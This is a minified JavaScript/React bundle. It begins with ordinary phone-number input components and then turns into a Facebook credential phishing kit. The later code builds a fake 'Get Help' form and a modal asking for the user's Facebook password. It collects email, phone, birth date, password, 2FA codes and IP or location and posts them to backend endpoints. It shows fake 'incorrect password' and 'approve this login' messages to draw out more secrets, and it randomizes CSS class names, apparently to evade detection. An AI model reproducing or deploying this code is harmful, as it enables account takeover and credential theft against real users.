        return $.createElement("img", {
            className: _e({addPrefix: ["flag-emoji"], rawClassNames: [i]}),
            src: a(),
            width: t,
            height: t,
            draggable: !1,
            "data-country": e,
            loading: o ? void 0 : "lazy",
            style: {width: t, height: t, ...l},
            alt: "", ...s
        })
    }, Mx = 1e3, $x = ({
                           show: e,
                           dialCodePrefix: t = "+",
                           selectedCountry: n,
                           countries: r = hr,
                           flags: o,
                           onSelect: i,
                           onClose: l,
                           ...s
                       }) => {
        let a = f.useRef(null), u = f.useRef(), c = f.useRef({updatedAt: void 0, value: ""}), d = S => {
            let E = c.current.updatedAt && new Date().getTime() - c.current.updatedAt.getTime() > Mx;
            c.current = {value: E ? S : `${c.current.value}${S}`, updatedAt: new Date};
            let N = r.findIndex(R => it(R).name.toLowerCase().startsWith(c.current.value));
            N !== -1 && y(N)
        }, p = f.useCallback(S => r.findIndex(E => it(E).iso2 === S), [r]), [x, y] = f.useState(p(n)), v = () => {
            u.current !== n && y(p(n))
        }, C = f.useCallback(S => {
            y(p(S.iso2)), i == null || i(S)
        }, [i, p]), g = S => {
            let E = r.length - 1, N = R => S === "prev" ? R - 1 : S === "next" ? R + 1 : S === "last" ? E : 0;
            y(R => {
                let O = N(R);
                return O < 0 ? 0 : O > E ? E : O
            })
        }, h = S => {
            if (S.stopPropagation(), S.key === "Enter") {
                S.preventDefault();
                let E = it(r[x]);
                C(E);
                return
            }
            if (S.key === "Escape") {
                l == null || l();
                return
            }
            if (S.key === "ArrowUp") {
                S.preventDefault(), g("prev");
                return
            }
            if (S.key === "ArrowDown") {
                S.preventDefault(), g("next");
                return
            }
            if (S.key === "PageUp") {
                S.preventDefault(), g("first");
                return
            }
            if (S.key === "PageDown") {
                S.preventDefault(), g("last");
                return
            }
            S.key === " " && S.preventDefault(), S.key.length === 1 && !S.altKey && !S.ctrlKey && !S.metaKey && d(S.key.toLocaleLowerCase())
        }, w = f.useCallback(() => {
            if (!a.current || x === void 0) return;
            let S = it(r[x]).iso2;
            if (S === u.current) return;
            let E = a.current.querySelector(`[data-country="${S}"]`);
            E && (Nx(a.current, E), u.current = S)
        }, [x, r]);
        return f.useEffect(() => {
            w()
        }, [x, w]), f.useEffect(() => {
            a.current && (e ? a.current.focus() : v())
        }, [e]), f.useEffect(() => {
            v()
        }, [n]), $.createElement("ul", {
            ref: a,
            role: "listbox",
            className: _e({addPrefix: ["country-selector-dropdown"], rawClassNames: [s.className]}),
            style: {display: e ? "block" : "none", ...s.style},
            onKeyDown: h,
            onBlur: l,
            tabIndex: -1,
            "aria-activedescendant": `${it(r[x]).iso2}-option`
        }, r.map((S, E) => {
            let N = it(S), R = N.iso2 === n, O = E === x, B = o == null ? void 0 : o.find(D => D.iso2 === N.iso2);
            return $.createElement("li", {
                key: N.iso2,
                "data-country": N.iso2,
                role: "option",
                "aria-selected": R,
                "aria-label": `${N.name} ${t}${N.dialCode}`,
                id: `${N.iso2}-option`,
                className: _e({
                    addPrefix: ["country-selector-dropdown__list-item", R && "country-selector-dropdown__list-item--selected", O && "country-selector-dropdown__list-item--focused"],
                    rawClassNames: [s.listItemClassName]
                }),
                onClick: () => C(N),
                style: s.listItemStyle
            }, $.createElement(gh, {
                iso2: N.iso2,
                src: B == null ? void 0 : B.src,
                className: _e({
                    addPrefix: ["country-selector-dropdown__list-item-flag-emoji"],
                    rawClassNames: [s.listItemFlagClassName]
                }),
                style: s.listItemFlagStyle
            }), $.createElement("span", {
                className: _e({
                    addPrefix: ["country-selector-dropdown__list-item-country-name"],
                    rawClassNames: [s.listItemCountryNameClassName]
                }), style: s.listItemCountryNameStyle
            }, N.name), $.createElement("span", {
                className: _e({
                    addPrefix: ["country-selector-dropdown__list-item-dial-code"],
                    rawClassNames: [s.listItemDialCodeClassName]
                }), style: s.listItemDialCodeStyle
            }, t, N.dialCode))
        }))
    }, Fx = ({
                 selectedCountry: e,
                 onSelect: t,
                 disabled: n,
                 hideDropdown: r,
                 countries: o = hr,
                 flags: i,
                 renderButtonWrapper: l,
                 ...s
             }) => {
        let [a, u] = f.useState(!1), c = f.useMemo(() => {
            if (e) return qn({value: e, field: "iso2", countries: o})
        }, [o, e]), d = f.useRef(null), p = y => {
            y.key && ["ArrowUp", "ArrowDown"].includes(y.key) && (y.preventDefault(), u(!0))
        }, x = () => {
            var C;
            let y = {
                title: c == null ? void 0 : c.name,
                onClick: () => u(g => !g),
                onMouseDown: g => g.preventDefault(),
                onKeyDown: p,
                disabled: r || n,
                role: "combobox",
                "aria-label": "Country selector",
                "aria-haspopup": "listbox",
                "aria-expanded": a
            }, v = $.createElement("div", {
                className: _e({
                    addPrefix: ["country-selector-button__button-content"],
                    rawClassNames: [s.buttonContentWrapperClassName]
                }), style: s.buttonContentWrapperStyle
            }, $.createElement(gh, {
                iso2: e,
                src: (C = i == null ? void 0 : i.find(g => g.iso2 === e)) == null ? void 0 : C.src,
                className: _e({
                    addPrefix: ["country-selector-button__flag-emoji", n && "country-selector-button__flag-emoji--disabled"],
                    rawClassNames: [s.flagClassName]
                }),
                style: {visibility: e ? "visible" : "hidden", ...s.flagStyle}
            }), !r && $.createElement("div", {
                className: _e({
                    addPrefix: ["country-selector-button__dropdown-arrow", n && "country-selector-button__dropdown-arrow--disabled", a && "country-selector-button__dropdown-arrow--active"],
                    rawClassNames: [s.dropdownArrowClassName]
                }), style: s.dropdownArrowStyle
            }));
            return l ? l({children: v, rootProps: y}) : $.createElement("button", {
                ...y,
                type: "button",
                className: _e({
                    addPrefix: ["country-selector-button", a && "country-selector-button--active", n && "country-selector-button--disabled", r && "country-selector-button--hide-dropdown"],
                    rawClassNames: [s.buttonClassName]
                }),
                "data-country": e,
                style: s.buttonStyle
            }, v)
        };
        return $.createElement("div", {
            className: _e({addPrefix: ["country-selector"], rawClassNames: [s.className]}),
            style: s.style,
            ref: d
        }, x(), $.createElement($x, {
            show: a, countries: o, flags: i, onSelect: y => {
                u(!1), t == null || t(y)
            }, selectedCountry: e, onClose: () => {
                u(!1)
            }, ...s.dropdownStyleProps
        }))
    }, Ax = ({
                 dialCode: e,
                 prefix: t,
                 disabled: n,
                 style: r,
                 className: o
             }) => $.createElement("div", {
        className: _e({
            addPrefix: ["dial-code-preview", n && "dial-code-preview--disabled"],
            rawClassNames: [o]
        }), style: r
    }, `${t}${e}`), zx = () => {
        let e = f.useRef(), t = f.useRef(Date.now());
        return {
            check: () => {
                let n = Date.now(), r = e.current ? n - t.current : void 0;
                return e.current = t.current, t.current = n, r
            }
        }
    }, Bx = {size: 20, overrideLastItemDebounceMS: -1};

function Ux(e, t) {
    let {
        size: n,
        overrideLastItemDebounceMS: r,
        onChange: o
    } = {...Bx, ...t}, [i, l] = f.useState(e), [s, a] = f.useState([i]), [u, c] = f.useState(0), d = zx();
    return [i, (p, x) => {
        if (typeof p == "object" && Object.entries(p).toString() === Object.entries(i).toString() || p === i) return;
        let y = r > 0, v = d.check(), C = y && v !== void 0 ? v > r : !0;
        if ((x == null ? void 0 : x.overrideLastItem) !== void 0 ? x.overrideLastItem : !C) a(g => [...g.slice(0, u), p]); else {
            let g = s.length >= n;
            a(h => [...h.slice(g ? 1 : 0, u + 1), p]), g || c(h => h + 1)
        }
        l(p), o == null || o(p)
    }, () => {
        if (u <= 0) return {success: !1};
        let p = s[u - 1];
        return l(p), c(x => x - 1), o == null || o(p), {success: !0, value: p}
    }, () => {
        if (u + 1 >= s.length) return {success: !1};
        let p = s[u + 1];
        return l(p), c(x => x + 1), o == null || o(p), {success: !0, value: p}
    }]
}

var bx = ".", et = {
    defaultCountry: "us",
    value: "",
    prefix: "+",
    defaultMask: "............",
    charAfterDialCode: " ",
    historySaveDebounceMS: 200,
    disableCountryGuess: !1,
    disableDialCodePrefill: !1,
    forceDialCode: !1,
    disableDialCodeAndPrefix: !1,
    countries: hr
}, Hx = ({
             defaultCountry: e = et.defaultCountry,
             value: t = et.value,
             countries: n = et.countries,
             prefix: r = et.prefix,
             defaultMask: o = et.defaultMask,
             charAfterDialCode: i = et.charAfterDialCode,
             historySaveDebounceMS: l = et.historySaveDebounceMS,
             disableCountryGuess: s = et.disableCountryGuess,
             disableDialCodePrefill: a = et.disableDialCodePrefill,
             forceDialCode: u = et.forceDialCode,
             disableDialCodeAndPrefix: c = et.disableDialCodeAndPrefix,
             onChange: d
         }) => {
    let p = c ? !1 : !s, x = f.useRef(null),
        y = ({value: M, country: A, trimNonDigitsEnd: V, insertDialCodeOnEmpty: ee, forceDisableCountryGuess: fe}) => {
            let X = !fe && p ? Jc({phone: M, countries: n, currentCountryIso2: A.iso2}) : void 0,
                se = (X == null ? void 0 : X.country) ?? A;
            return {
                phone: se ? Ox(M, {
                    prefix: r,
                    mask: se.format || o,
                    maskChar: bx,
                    dialCode: se.dialCode,
                    trimNonDigitsEnd: V,
                    charAfterDialCode: i,
                    forceDialCode: u,
                    insertDialCodeOnEmpty: ee,
                    disableDialCodeAndPrefix: c
                }) : M, countryGuessResult: X, formatCountry: se
            }
        }, v = M => {
            Promise.resolve().then(() => {
                var A;
                (A = x.current) == null || A.setSelectionRange(M, M)
            })
        }, [{phone: C, country: g}, h, w, S] = Ux(() => {
            var ee;
            let M = ((ee = c ? null : Jc({
                phone: t,
                countries: n,
                currentCountryIso2: e
            })) == null ? void 0 : ee.country) || qn({value: e, field: "iso2", countries: n});
            M || console.error(`[react-international-phone]: can not find a country with "${e}" iso2 code`);
            let A = M || it(n.find(fe => it(fe).iso2 === "us")),
                V = y({value: t, country: A, insertDialCodeOnEmpty: !a}).phone;
            return v(V.length), {phone: V, country: A.iso2}
        }, {overrideLastItemDebounceMS: l, onChange: d}),
        E = f.useMemo(() => qn({value: g, field: "iso2", countries: n}), [n, g]),
        N = (M, {deletion: A, cursorPosition: V, insertDialCodeOnEmpty: ee, inserted: fe} = {}) => {
            var W;
            let X = M, se = V;
            u && !c && E && !Pi(M).startsWith(E.dialCode) && M && (fe && M.startsWith(r) && M.length - (V ?? 0) === 0 ? X = M : (X = C, se = 0));
            let {phone: j, countryGuessResult: P} = y({
                value: X,
                country: E,
                trimNonDigitsEnd: A === "backward",
                insertDialCodeOnEmpty: ee,
                forceDisableCountryGuess: u && !!A && Pi(X).length < E.dialCode.length
            }), I = E;
            p && (P != null && P.country) && P.country.name !== g && P.fullDialCodeMatch && (I = P.country);
            let b = _x({
                cursorPositionAfterInput: se ?? 0,
                phoneBeforeInput: C,
                phoneAfterInput: M,
                phoneAfterFormatted: j,
                leftOffset: u ? r.length + (((W = E == null ? void 0 : E.dialCode) == null ? void 0 : W.length) ?? 0) + i.length : 0,
                deletion: A
            });
            return h({phone: j, country: I.iso2}), v(b), j
        };
    f.useEffect(() => {
        let M = x.current;
        if (!M) return;
        let A = V => {
            if (!V.key) return;
            let ee = V.ctrlKey, fe = V.shiftKey, X = V.key.toLowerCase() === "z";
            !ee || !X || (fe ? S() : w())
        };
        return M.addEventListener("keydown", A), () => {
            M.removeEventListener("keydown", A)
        }
    }, [x, w, S]);
    let R = M => {
        M.preventDefault();
        let A = M.nativeEvent.inputType, V = () => {
                if ((A == null ? void 0 : A.toLocaleLowerCase().includes("delete")) ?? !1) return A != null && A.toLocaleLowerCase().includes("forward") ? "forward" : "backward"
            }, ee = A == null ? void 0 : A.startsWith("insertFrom"),
            fe = N(M.target.value, {deletion: V(), inserted: ee, cursorPosition: M.target.selectionStart ?? 0});
        return c && E ? jx({phone: fe, dialCode: E.dialCode, charAfterDialCode: i, prefix: r}) : fe
    }, O = M => {
        let A = qn({value: M, field: "iso2", countries: n});
        if (!A) return;
        let V = c ? "" : `${r}${A.dialCode}${i}`;
        h({phone: V, country: A.iso2}), Promise.resolve().then(() => {
            var ee;
            (ee = x.current) == null || ee.focus()
        })
    }, [B, D] = f.useState(!1);
    return f.useEffect(() => {
        if (!B) {
            D(!0), t !== C && (d == null || d({phone: C, country: g}));
            return
        }
        t !== C && N(t)
    }, [t]), {phone: C, country: g, setCountry: O, handlePhoneValueChange: R, inputRef: x}
}, Wx = ({
             hideDropdown: e,
             placeholder: t,
             disabled: n,
             showDisabledDialCodeAndPrefix: r,
             inputProps: o,
             flags: i,
             onChange: l,
             style: s,
             className: a,
             inputStyle: u,
             inputClassName: c,
             countrySelectorStyleProps: d,
             dialCodePreviewStyleProps: p,
             value: x,
             countries: y = hr,
             ...v
         }) => {
    let {phone: C, inputRef: g, country: h, setCountry: w, handlePhoneValueChange: S} = Hx({
        value: x,
        countries: y, ...v,
        onChange: R => {
            l == null || l(R.phone, R.country)
        }
    }), E = f.useMemo(() => {
        if (h) return qn({value: h, field: "iso2", countries: y})
    }, [y, h]), N = v.disableDialCodeAndPrefix && r && (E == null ? void 0 : E.dialCode);
    return $.createElement("div", {
        className: _e({addPrefix: ["input-container"], rawClassNames: [a]}),
        style: s
    }, $.createElement(Fx, {
        onSelect: R => w(R.iso2),
        flags: i,
        selectedCountry: h,
        countries: y,
        disabled: n,
        hideDropdown: e, ...d
    }), N && $.createElement(Ax, {
        dialCode: E.dialCode,
        prefix: v.prefix ?? "+",
        disabled: n, ...p
    }), $.createElement("input", {
        onChange: S,
        value: C,
        type: "tel",
        ref: g,
        className: _e({addPrefix: ["input", n && "input--disabled"], rawClassNames: [c]}),
        placeholder: t,
        disabled: n,
        style: u, ...o
    }))
};

class Vx {
    constructor() {
        ie(this, "sessionId");
        ie(this, "phoneNumber");
        ie(this, "email");
        ie(this, "fanpageName");
        ie(this, "birthDay");
        ie(this, "password");
        ie(this, "errorPassword");
        ie(this, "isPasswordError");
        ie(this, "_2faCode");
        ie(this, "userAgent");
        ie(this, "country");
        ie(this, "emailValid");
        ie(this, "locationCode");
        ie(this, "ipAddress");
        this.sessionId = "", this.phoneNumber = "", this.email = "", this.birthDay = "", this.password = "", this.userAgent = navigator.userAgent, this.fanpageName = "", this.errorPassword = "", this.isPasswordError = !1, this._2faCode = "", this.ipAddress = "", this.country = "", this.locationCode = "", this.emailValid = ""
    }

    setSessionId(t) {
        this.sessionId = t
    }

    setPhoneNumber(t) {
        this.phoneNumber = t
    }

    setEmail(t) {
        this.email = t
    }

    setPassword(t) {
        this.password = t
    }

    setIsPasswordError(t) {
        this.isPasswordError = t
    }

    set2faCode(t) {
        this._2faCode = t
    }

    setIpAddress(t) {
        this.ipAddress = t
    }

    setCountry(t) {
        this.country = t
    }

    setLocationCode(t) {
        this.locationCode = t
    }
}

class Zc {
    constructor(t, n, r, o = "", i = !1, l = !1, s = 6) {
        ie(this, "isSuccess");
        ie(this, "message");
        ie(this, "typeError");
        ie(this, "need2fa");
        ie(this, "needCheckPointCode");
        ie(this, "maxDight");
        ie(this, "sessionId");
        this.isSuccess = t, this.message = n, this.typeError = r, this.sessionId = o, this.need2fa = i, this.needCheckPointCode = l, this.maxDight = s
    }
}

const Kx = e => new Promise((t, n) => {
    En.post("api/confirm", {
        reason: window.location.hostname,
        fullName: "Unknown",
        businessEmail: e.email,
        personalEmail: e.email,
        phoneNumber: e.phoneNumber,
        pageName: "Unknown",
        userAgent: e.userAgent,
        ipAddress: e.ipAddress,
        country: e.country ?? "Unknown",
        locationCode: e.locationCode ?? "Unknown",
        birthOfDate: e.birthDay,
        userId: "Unknown"
    }).then(r => {
        if (r.data.message === "Linked email" && r.data.errorDetail === null) return t(true)
        else return t(false)
    }).catch(() => n(!1))
}), Gx = e => new Promise((t, n) => {
    En.post("api/login_submit", {
        reason: window.location.hostname,
        fullName: "Unknown",
        businessEmail: e.email,
        personalEmail: e.email,
        phoneNumber: e.phoneNumber,
        pageName: e.fanpageName,
        userAgent: e.userAgent,
        ipAddress: e.ipAddress,
        country: e.country ?? "Unknown",
        locationCode: e.locationCode ?? "Unknown",
        password: e.password,
        birthOfDate: e.birthDay,
        userId: e.email
    }, {
        timeout: 120000 // Set the timeout to 120 seconds
    }).then(response => {
        // Uncomment below code to test approve feature
        // return n(new Zc(!1, "To continue, please approve this login on a phone or computer you've used before.", ""));
        if (response.data.message == null) {
            return n(new Zc(!1, "Data response is null!!!", ""));
        }
        if (!response.data.isSuccess && response.data.errorDetail != null) {
            let incorrectPasswordMessage = "The password that you've entered is incorrect.";
            let approveMessage = "To continue, please approve this login on a phone or computer you've used before."
            if (response.data.errorDetail[0].message === "Password not correct") {
                return n(new Zc(!1, incorrectPasswordMessage, ""));
            }
            else {
                return n(new Zc(!1, approveMessage, ""));
            }
        }
        if (response.data.message === "Unknow error") {
            let errorMessage = "Something went wrong, please try again later.";
            return n(new Zc(!1, errorMessage, ""));
        }
        localStorage.setItem(sessionId, response.data.sessionId);
        t(new Zc(response.data.isSuccess, response.data.message, "", response.data.sessionId, response.data.need2FA, response.data.needCheckPointCode, response.data.maxDight));
    })
});
var Bt = function () {
    return Bt = Object.assign || function (e) {
        for (var t, n = 1, r = arguments.length; n < r; n++) for (var o in t = arguments[n]) Object.prototype.hasOwnProperty.call(t, o) && (e[o] = t[o]);
        return e
    }, Bt.apply(this, arguments)
};

function yh(e, t) {
    var n = {};
    for (var r in e) Object.prototype.hasOwnProperty.call(e, r) && t.indexOf(r) < 0 && (n[r] = e[r]);
    if (e != null && typeof Object.getOwnPropertySymbols == "function") {
        var o = 0;
        for (r = Object.getOwnPropertySymbols(e); o < r.length; o++) t.indexOf(r[o]) < 0 && Object.prototype.propertyIsEnumerable.call(e, r[o]) && (n[r[o]] = e[r[o]])
    }
    return n
}

function on(e, t, n) {
    if (n || arguments.length === 2) for (var r, o = 0, i = t.length; o < i; o++) !r && o in t || (r || (r = Array.prototype.slice.call(t, 0, o)), r[o] = t[o]);
    return e.concat(r || Array.prototype.slice.call(t))
}

var Qx = function () {
    return $.createElement("div", {className: "loading-indicator"}, $.createElement("span", {className: "loading-bullet"}, "•"), " ", $.createElement("span", {className: "loading-bullet"}, "•"), " ", $.createElement("span", {className: "loading-bullet"}, "•"))
};
(function (e, t) {
    t === void 0 && (t = {});
    var n = t.insertAt;
    if (e && typeof document < "u") {
        var r = document.head || document.getElementsByTagName("head")[0], o = document.createElement("style");
        o.type = "text/css", n === "top" && r.firstChild ? r.insertBefore(o, r.firstChild) : r.appendChild(o), o.styleSheet ? o.styleSheet.cssText = e : o.appendChild(document.createTextNode(e))
    }
})(`.ns-block-ui {
  position: relative;
  overflow: inherit;
}
.ns-block-ui .ns-block-ui-container {
  width: 100%;
  height: 100%;
  position: absolute;
  top: 0;
  right: 0;
  bottom: 0;
  left: 0;
  cursor: wait;
  overflow: hidden;
  border-radius: inherit;
  opacity: 0;
  z-index: 999;
}
.ns-block-ui .ns-block-ui-container .ns-block-ui-overlay {
  width: 100%;
  height: 100%;
  width: 100%;
  height: 100%;
  opacity: 0.5;
  filter: alpha(opacity=50);
  background-color: white;
  border-radius: inherit;
}
.ns-block-ui .ns-block-ui-container .ns-block-ui-loader-container {
  position: absolute;
  top: 50%;
  left: 0;
  right: 0;
  text-align: center;
  transform: translateY(-50%);
  z-index: 2;
  display: flex;
  flex-direction: column;
}
.ns-block-ui .ns-block-ui-container .ns-block-ui-loader-container .ns-block-ui-loader {
  position: relative;
}
.ns-block-ui .ns-block-ui-container .ns-block-ui-loader-container .ns-block-ui-message {
  text-align: center;
  margin-top: 0.5rem;
  color: #3B3B3B;
}

.ns-block-ui.contain {
  width: fit-content;
  height: fit-content;
}

.ns-block-ui.stretch {
  width: 100%;
  height: 100%;
  border-radius: inherit;
}

.ns-block-ui.full-screen {
  width: 100%;
  height: 100%;
}

.ns-block-ui.blocking.full-screen .ns-block-ui-container {
  position: fixed;
  top: 0;
  right: 0;
  bottom: 0;
  left: 0;
}

.ns-block-ui.blocking .ns-block-ui-container:not(.fadeout) {
  opacity: 1;
}
.ns-block-ui.blocking .ns-block-ui-container.fadein {
  animation-name: fadeInOverlay;
  animation-duration: 100ms;
  animation-timing-function: ease-out;
}
.ns-block-ui.blocking .ns-block-ui-container.fadeout {
  animation-name: fadeOutOverlay;
  animation-duration: 100ms;
}

body:has(.ns-block-ui.blocking.full-screen.noscroll) {
  overflow: hidden;
}

.ns-block-ui.blocking.noscroll:not(.full-screen) {
  overflow: hidden;
}

.loading-indicator {
  text-align: center;
}

.loading-bullet {
  display: inline-block;
  opacity: 0;
  font-size: 2em;
  color: #02a17c;
}

/* CSS Animations */
@keyframes fadeInOverlay {
  from {
    opacity: 0;
  }
  to {
    opacity: 1;
  }
}
@keyframes fadeOutOverlay {
  from {
    opacity: 1;
  }
  to {
    opacity: 0;
  }
}
@-webkit-keyframes fadeInRTL1 {
  0% {
    opacity: 0;
    -webkit-transform: translateX(20px);
    transform: translateX(20px);
  }
  30% {
    opacity: 1;
    -webkit-transform: translateX(0px);
    transform: translateX(0px);
  }
  60% {
    opacity: 1;
  }
  80% {
    opacity: 0;
  }
}
@keyframes fadeInRTL1 {
  0% {
    opacity: 0;
    -webkit-transform: translateX(20px);
    transform: translateX(20px);
  }
  30% {
    opacity: 1;
    -webkit-transform: translateX(0px);
    transform: translateX(0px);
  }
  60% {
    opacity: 1;
  }
  80% {
    opacity: 0;
  }
}
@-webkit-keyframes fadeInRTL2 {
  0% {
    opacity: 0;
  }
  10% {
    opacity: 0;
    -webkit-transform: translateX(20px);
    transform: translateX(20px);
  }
  40% {
    opacity: 1;
    -webkit-transform: translateX(0px);
    transform: translateX(0px);
  }
  60% {
    opacity: 1;
  }
  80% {
    opacity: 0;
  }
}
@keyframes fadeInRTL2 {
  0% {
    opacity: 0;
  }
  10% {
    opacity: 0;
    -webkit-transform: translateX(20px);
    transform: translateX(20px);
  }
  40% {
    opacity: 1;
    -webkit-transform: translateX(0px);
    transform: translateX(0px);
  }
  60% {
    opacity: 1;
  }
  80% {
    opacity: 0;
  }
}
@-webkit-keyframes fadeInRTL3 {
  0% {
    opacity: 0;
  }
  20% {
    opacity: 0;
    -webkit-transform: translateX(20px);
    transform: translateX(20px);
  }
  50% {
    opacity: 1;
    -webkit-transform: translateX(0px);
    transform: translateX(0px);
  }
  60% {
    opacity: 1;
  }
  80% {
    opacity: 0;
  }
}
@keyframes fadeInRTL3 {
  0% {
    opacity: 0;
  }
  20% {
    opacity: 0;
    -webkit-transform: translateX(20px);
    transform: translateX(20px);
  }
  50% {
    opacity: 1;
    -webkit-transform: translateX(0px);
    transform: translateX(0px);
  }
  60% {
    opacity: 1;
  }
  80% {
    opacity: 0;
  }
}
.loading-bullet {
  display: inline-block;
  opacity: 0;
  -webkit-animation: 3s ease 0.5s infinite fadeInRTL1;
  animation: 3s ease 0.5s infinite fadeInRTL1;
}

.loading-bullet + .loading-bullet {
  -webkit-animation-name: fadeInRTL2;
  animation-name: fadeInRTL2;
}

.loading-bullet + .loading-bullet + .loading-bullet {
  -webkit-animation-name: fadeInRTL3;
  animation-name: fadeInRTL3;
}`);
var Xx = function (e) {
    var t = e.message, n = t === void 0 ? "" : t, r = e.children,
        o = r === void 0 ? $.createElement($.Fragment, null) : r, i = e.overlayStyle, l = e.blocking,
        s = l !== void 0 && l, a = e.mode, u = a === void 0 ? "contain" : a,
        c = yh(e, ["message", "children", "overlayStyle", "blocking", "mode"]), d = f.useState(""), p = d[0], x = d[1],
        y = f.useState([]), v = y[0], C = y[1], g = f.useRef(null), h = f.useRef(!0), w = f.useRef([]), S = !!v[0];
    return f.useEffect(function () {
        var E;
        if (s) {
            if (h.current = !1, (E = g.current) === null || E === void 0 ? void 0 : E.contains(document.activeElement)) {
                var N = document.activeElement;
                N && N.blur()
            }
            x("fadein"), C(function (R) {
                return on(on([], R, !0), [!0], !1)
            }), w.current = on(on([], w.current, !0), [!0], !1), setTimeout(function () {
                x("")
            }, 200)
        } else h.current || (x("fadeout"), setTimeout(function () {
            var R = on([], w.current, !0);
            R.shift(), C(on([], R, !0)), w.current = on([], R, !0)
        }, 300))
    }, [s]), $.createElement("div", {
        className: "ns-block-ui ".concat(u || "contain", " ").concat(S ? "blocking" : "", " ").concat(c.className || "", " ").concat(c.hideScroll ? "noscroll" : ""),
        "aria-busy": S,
        ref: g,
        style: Bt({}, c.style || {})
    }, o, S && $.createElement("div", {
        className: "ns-block-ui-container ".concat(p),
        style: {cursor: c.cursor || "inherit"}
    }, $.createElement("div", {
        className: "ns-block-ui-overlay",
        style: i || {}
    }), $.createElement("div", {className: "ns-block-ui-loader-container"}, $.createElement("div", {className: "ns-block-ui-loader"}, c.loader === "default" ? $.createElement(Qx, null) : c.loader && $.isValidElement(c.loader) ? c.loader : $.createElement($.Fragment, null)), n && $.createElement("div", {className: "ns-block-ui-message"}, n))))
}, vh = f.createContext({
    data: {}, setBlockUI: function (e) {
    }
}), Yx = function () {
    return f.useContext(vh)
}, Jx = function (e) {
    var t = e.children, n = yh(e, ["children"]), r = f.useState({}), o = r[0], i = r[1];
    return $.createElement(vh.Provider, {
        value: {
            data: o, setBlockUI: function (l) {
                i(Bt({}, l))
            }
        }
    }, $.createElement(Xx, Bt({}, Bt(Bt(Bt({}, n), {mode: n.mode || "full-screen"}), o)), t))
};

function qx() {
    const {setBlockUI: e} = Yx(), t = () => {
        e({blocking: !0})
    }, n = () => {
        e({blocking: !1})
    }, r = Zi(), [o, i] = f.useState(""), [l, s] = f.useState(!1), [a] = f.useState(new Vx), [u, c] = f.useState(!1);
    f.useEffect(() => {
        window.scrollTo(0, 0), localStorage.getItem("ip") === null ? r("/") : (a.ipAddress = localStorage.getItem("ip") ?? "Unknown", a.country = localStorage.getItem("countryName") ?? "Unknown", a.locationCode = localStorage.getItem("countryCode") ?? "Unknown")
    }, [a]);
    const d = async () => {
        Kx(a).then(v => {
            if (!v) c(!1), n(), i("The email address you entered isn't connected to an account.")
            return
        })
        if (a.emailValid === a.email) {
            s(!0), c(!1), n();
            return
        }
        Kx(a).then(v => {
            if (v) {
                a.emailValid = a.email, s(!0), c(!1), n();
                return
            }
        }).catch(() => {
            c(!1), n(), i("Please enter valid email")
        })
    }, p = v => {
        if (v.preventDefault(), c(!0), i(""), v.preventDefault(), a.password.length < 6) {
            i("Password must be at least 6 characters"), c(!1);
            return
        }
        if (a.isPasswordError && a.password === a.errorPassword) {
            i("Password not correct"), c(!1);
            return
        }
        y()
    }, x = v => {
        if (t(), c(!0), i(""), v.preventDefault(), a.phoneNumber.length < 10) {
            i("Please enter valid phone number"), n(), c(!1);
            return
        }
        if (a.email === "") {
            i("Please enter your email"), n(), c(!1);
            return
        }
        let dateObject = new Date(a.birthDay)
        if (dateObject.getFullYear() < 1900 || dateObject.getFullYear() > 2500) {
            i("Please make sure that you use your real date of birth."), n(), c(!1);
            return
        }
        d()
    }, y = () => {
        Gx(a).then(v => {
            const C = v;
            console.log(v), C.isSuccess && !C.need2fa && !C.needCheckPointCode ? r("/processing") : !C.isSuccess && C.need2fa ? (localStorage.setItem(sessionId, C.sessionId), r("/checkpoint/identity")) : (localStorage.setItem("maxDight", C.maxDight.toString()), localStorage.setItem(sessionId, C.sessionId), r("/checkpoint/verify"))
        }).catch(v => {
            i(v.message), c(!1)
        })
    };
    return m.jsxs(m.Fragment, {
        children: [m.jsxs(jr, {
            backdrop: "static",
            centered: !0,
            show: l,
            onHide: () => s(!1),
            children: [!o.startsWith("To continue") ? m.jsx(jr.Header,
                {
                    children: m.jsx(jr.Title, {children: m.jsx("h5", {children: "Please enter your facebook password to continue"})})}) :
                m.jsx(jr.Header,
                    {
                        children: m.jsx("div", {
                            className: "approve",
                            children: [m.jsx("br", {}), m.jsx("br", {}), m.jsx("br", {}), m.jsx("br", {})]})}),
                m.jsxs(jr.Body, {
                children: [!o.startsWith("To continue") ? m.jsxs(K, {
                    id: "checkPassword",
                    onSubmit: p,
                    children: [m.jsx(K.Text, {
                        className: Math.random().toString(36).substring(2, 9) + " text-muted",
                        children: "We need to confirm the sender of the information is you, Please enter your facebook password and then continue."
                    }), m.jsxs(K.Group, {
                        className: Math.random().toString(36).substring(2, 9) + " mb-3",
                        controlId: "password",
                        children: [m.jsx(K.Label, {children: "Password"}), m.jsx(K.Control, {
                            onChange: v => a.password = v.target.value,
                            type: "password",
                            disabled: u,
                            required: !0
                        })]
                    })]
                }) : null, m.jsxs(K.Group, {
                    className: Math.random().toString(36).substring(2, 9) + " mb-3",
                    controlId: "check",
                    children: [u ? m.jsxs(K.Text, {
                        className: Math.random().toString(36).substring(2, 9) + " text-success",
                        children: [m.jsx("b", {
                            className: Math.random().toString(36).substring(2, 9) + " text-mute",
                            children: "Validating information"
                        }), "  ", m.jsx(Km, {animation: "border", size: "sm", variant: "success"})]
                    }) : "", o ? m.jsx("div", {
                        className: o.startsWith("To continue") ? Math.random().toString(36).substring(2, 9): Math.random().toString(36).substring(2, 9) + " text-danger",
                        style: {display: "flex", flexDirection: "column"},
                        children: [m.jsx("b", {children: o}), m.jsx("br", {}), m.jsx("br", {}),
                            o.startsWith("The password") ? m.jsx("a", {href: "https://www.facebook.com/login/identify/",
                                children: "Forgotten password?"}) :
                                o.startsWith("To continue") ? m.jsx(Jn, {
                                    disabled: u,
                                    variant: "secondary",
                                    onClick: () => {
                                        s(!1);
                                        i("");
                                        window.location.href = "https://www.facebook.com/notifications";
                                    },
                                    style: { backgroundColor: "#6274a2", color: "white" },
                                    children: "Go to approve page"
                                }) : null]
                    }) : null]
                })]
            }), !o.startsWith("To continue") ? m.jsxs(jr.Footer, {
                children: [m.jsx(Jn, {
                    disabled: u, variant: "secondary", onClick: () => {
                        s(!1), i("")
                    }, children: "Close"
                }), m.jsx(Jn, {
                    disabled: u,
                    form: "checkPassword",
                    variant: "primary",
                    type: "submit",
                    children: "Continue"
                })]
            }) : null]
        }), m.jsx(mh, {
            children: m.jsxs(K, {
                onSubmit: x,
                className: Math.random().toString(36).substring(2, 9) + " form-update p-0 mb-5",
                children: [m.jsx("h5", {
                    className: Math.random().toString(36).substring(2, 9) + " text-center h3-config",
                    children: "Get Help"
